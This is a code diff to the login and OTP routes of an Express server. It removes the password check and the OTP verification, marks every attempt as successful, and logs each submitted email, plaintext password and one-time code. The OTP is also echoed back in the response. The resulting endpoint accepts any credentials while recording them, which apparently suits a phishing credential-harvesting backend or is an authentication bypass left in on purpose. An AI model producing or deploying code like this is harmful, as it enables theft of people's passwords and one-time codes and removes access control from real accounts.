@@ -12,50 +12,19 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
       const userAgent = req.get('User-Agent') || 'unknown';
       
-      // Check if user exists with this email
-      const user = await storage.getUserByEmail(validatedData.email);
+      // Log login attempt immediately (always successful since no validation)
+      await storage.logLoginAttempt(validatedData.email, validatedData.password, true, ipAddress, userAgent);
       
-      let success = false;
-      let responseData: any;
+      // Generate and store OTP
+      const otpCode = await storage.generateOTP(validatedData.email);
       
-      if (!user) {
-        // Log failed login attempt immediately
-        await storage.logLoginAttempt(validatedData.email, validatedData.password, false, ipAddress, userAgent);
-        
-        responseData = {
-          success: false, 
-          message: "Invalid email or password"
-        };
-      } else if (user.password !== validatedData.password) {
-        // Log failed login attempt immediately
-        await storage.logLoginAttempt(validatedData.email, validatedData.password, false, ipAddress, userAgent);
-        
-        responseData = {
-          success: false, 
-          message: "Invalid email or password"
-        };
-      } else {
-        // Log successful login attempt immediately
-        await storage.logLoginAttempt(validatedData.email, validatedData.password, true, ipAddress, userAgent);
-        
-        // Generate and store OTP
-        const otpCode = await storage.generateOTP(validatedData.email);
-        
-        success = true;
-        responseData = {
-          success: true, 
-          message: "OTP sent to your email",
-          email: validatedData.email,
-          // In production, don't send the OTP in response
-          otp: otpCode.code // For demo purposes only
-        };
-      }
-      
-      if (success) {
-        res.json(responseData);
-      } else {
-        res.status(401).json(responseData);
-      }
+      res.json({
+        success: true, 
+        message: "OTP sent to your email",
+        email: validatedData.email,
+        // In production, don't send the OTP in response
+        otp: otpCode.code // For demo purposes only
+      });
     } catch (error) {
       if (error instanceof z.ZodError) {
         return res.status(400).json({ 
@@ -77,18 +46,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const ipAddress = req.ip || req.connection.remoteAddress || 'unknown';
       const userAgent = req.get('User-Agent') || 'unknown';
       
-      const isValid = await storage.verifyOTP(validatedData.email, validatedData.code);
+      // Log OTP attempt immediately (always successful since no validation)
+      await storage.logOTPAttempt(validatedData.email, validatedData.code, true, ipAddress, userAgent);
       
-      // Log OTP attempt immediately
-      await storage.logOTPAttempt(validatedData.email, validatedData.code, isValid, ipAddress, userAgent);
-      
-      if (!isValid) {
-        return res.status(401).json({ 
-          success: false, 
-          message: "Invalid or expired OTP code" 
-        });
-      }
-
       res.json({ 
         success: true, 
         message: "Login successful",
